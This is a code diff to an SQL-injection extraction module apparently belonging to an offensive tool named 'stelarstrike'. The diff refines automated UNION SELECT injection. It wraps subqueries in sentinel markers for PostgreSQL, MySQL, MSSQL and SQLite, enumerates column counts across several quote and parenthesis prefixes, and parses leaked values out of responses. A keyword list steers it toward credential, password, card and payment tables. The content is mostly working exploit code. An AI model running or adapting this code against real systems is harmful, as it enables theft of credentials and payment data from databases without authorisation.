@@ -34,6 +34,10 @@ import re
 from dataclasses import dataclass, field
 from typing import Awaitable, Callable
 
+from stelarstrike.utils.logger import get_logger
+
+log = get_logger(__name__)
+
 _HIGH_VALUE_KEYWORDS = [
     "user", "admin", "auth", "login", "credential", "password",
     "account", "card", "transaction", "payment", "merchant",
@@ -252,79 +256,124 @@ class SQLiExtractor:
     # Core UNION injection
     # ---------------------------------------------------------------
 
+    # Sentinel markers — unique enough to not appear naturally in responses,
+    # short enough to not get truncated by VARCHAR columns.
+    _SENTINEL_START = "STELR0"
+    _SENTINEL_END   = "0RLETS"
+
+    def _wrap_sentinel(self, subquery: str) -> str:
+        """Wrap subquery output in sentinel markers using DB-appropriate concat."""
+        s, e = self._SENTINEL_START, self._SENTINEL_END
+        if self.db_type in ("postgresql", "sqlite"):
+            return f"'{s}'||({subquery})||'{e}'"
+        if self.db_type == "mysql":
+            return f"CONCAT('{s}',({subquery}),'{e}')"
+        if self.db_type == "mssql":
+            return f"'{s}'+CAST(({subquery}) AS NVARCHAR(MAX))+'{e}'"
+        # fallback — pipe concat works on most DBs
+        return f"'{s}'||({subquery})||'{e}'"
+
     async def _union_scalar(self, subquery: str) -> str:
         """
-        Inject a UNION SELECT with auto-enumerated column count and
-        return the reflected value from the response.
+        Inject a UNION SELECT and return the reflected value.
 
-        Tries column counts 1–15, adjusting for type mismatches.
-        Caches the working column count once found.
+        Strategy (in order per column count):
+          1. Try NULL-padded UNION with sentinel-wrapped subquery (string context).
+          2. If column-count mismatch → increment and retry.
+          3. If "works" but no sentinel in response → try numeric context prefix.
+          4. Cache the working column count on first success.
         """
         comment = self.db["comment"]
+        wrapped = self._wrap_sentinel(subquery)
 
-        start_col = self._col_count if self._col_count else 1
-        search_range = range(start_col, 16) if not self._col_count else [self._col_count]
+        col_range = [self._col_count] if self._col_count else range(1, 16)
 
-        for col_count in (list(search_range) if self._col_count else range(1, 16)):
-            cast_subquery = f"CAST(({subquery}) AS TEXT)"
+        for col_count in col_range:
             compat = self._compat_cols(col_count - 1)
+            parts = [wrapped] + ([compat] if compat else [])
+            cols_str = ",".join(parts)
 
-            parts = [cast_subquery] + ([compat] if compat else [])
-            payload = f"' UNION SELECT {','.join(parts)}{comment}"
-
-            try:
-                response = await self.inject(payload)
-            except Exception:
-                continue
-
-            lower = response.lower()
-            if "same number of columns" in lower or "each union query must have" in lower:
-                continue
-            if "union types" in lower or "invalid input syntax" in lower:
-                # Type mismatch — try without CAST
-                plain_parts = [f"({subquery})"] + ([compat] if compat else [])
-                payload = f"' UNION SELECT {','.join(plain_parts)}{comment}"
+            # Context 1: string context  (' UNION SELECT ...)
+            for prefix in (f"' UNION SELECT {cols_str}{comment}",
+                           f" UNION SELECT {cols_str}{comment}",
+                           f"') UNION SELECT {cols_str}{comment}"):
                 try:
-                    response = await self.inject(payload)
-                    lower = response.lower()
-                except Exception:
-                    continue
-                if "union types" in lower or "same number of columns" in lower:
+                    log.debug(f"sqli-extract: UNION probe col_count={col_count} prefix={prefix[:40]!r}")
+                    response = await self.inject(prefix)
+                except Exception as exc:  # noqa: BLE001
+                    log.debug(f"sqli-extract: inject failed: {exc}")
                     continue
 
-            value = self._extract_value(response)
-            if value and not self._looks_like_error(value):
-                if not self._col_count:
-                    self._col_count = col_count
-                return value
+                lower = response.lower()
 
+                # Column count mismatch — try next count
+                if any(s in lower for s in (
+                    "same number of columns",
+                    "each union query must have",
+                    "different number of columns",
+                    "number of columns",
+                )):
+                    log.debug(f"sqli-extract: col_count={col_count} mismatch with prefix {prefix[:30]!r}")
+                    break  # try next col_count, not next prefix
+
+                value = self._extract_value(response)
+                if value:
+                    log.debug(f"sqli-extract: ✓ got value (col_count={col_count}): {value[:60]!r}")
+                    if not self._col_count:
+                        self._col_count = col_count
+                    return value
+
+                log.debug(f"sqli-extract: sentinel not found in response ({len(response)} bytes)")
+
+        log.debug("sqli-extract: _union_scalar exhausted all column counts — no value extracted")
         return ""
 
     def _compat_cols(self, count: int) -> str:
+        """NULL is type-agnostic and works across all SQL dialects for padding."""
         if count <= 0:
             return ""
-        if self.db_type in ("postgresql", "mysql"):
-            return ",".join([f"'{i+1}'" for i in range(count)])
         return ",".join(["NULL"] * count)
 
     def _extract_value(self, response_body: str) -> str:
         """
         Extract the injected value from the response.
-        Tries JSON parsing first, then regex search for long strings.
+
+        Primary method: sentinel search (reliable regardless of HTML structure).
+        Fallback 1: JSON longest-string (for JSON APIs).
+        Fallback 2: regex (last resort, returns empty if ambiguous).
         """
-        # Method 1: JSON response — return the longest string value
+        s, e = self._SENTINEL_START, self._SENTINEL_END
+
+        # Primary: sentinel markers
+        idx_start = response_body.find(s)
+        if idx_start != -1:
+            idx_end = response_body.find(e, idx_start + len(s))
+            if idx_end != -1:
+                extracted = response_body[idx_start + len(s):idx_end].strip()
+                if extracted:
+                    return extracted
+
+        # Fallback 1: JSON response
         try:
             data = json.loads(response_body)
-            return self._longest_json_string(data)
+            val = self._longest_json_string(data)
+            if val and len(val) > 5 and not self._looks_like_error(val):
+                return val
         except (json.JSONDecodeError, TypeError, ValueError):
             pass
 
-        # Method 2: Regex — find a long standalone token not obviously markup
-        matches = re.findall(r'(?<!["\w])([A-Za-z0-9 _.@:|,\-]{12,})(?!["\w])', response_body)
-        if matches:
-            return max(matches, key=len)
+        # Fallback 2: regex (very conservative — only return if unambiguous)
+        matches = re.findall(
+            r'(?<!["\w/])([A-Za-z0-9_.@\-]{8,}\s[A-Za-z0-9_.@\-\s]{4,})(?!["\w/])',
+            response_body,
+        )
+        # Only use regex result if exactly one long match (avoids grabbing nav/CSS)
+        unique = [m.strip() for m in matches if len(m.strip()) > 10 and not self._looks_like_error(m)]
+        if len(unique) == 1:
+            return unique[0]
 
         return ""
+
 
     def _longest_json_string(self, obj) -> str:
         best = ""
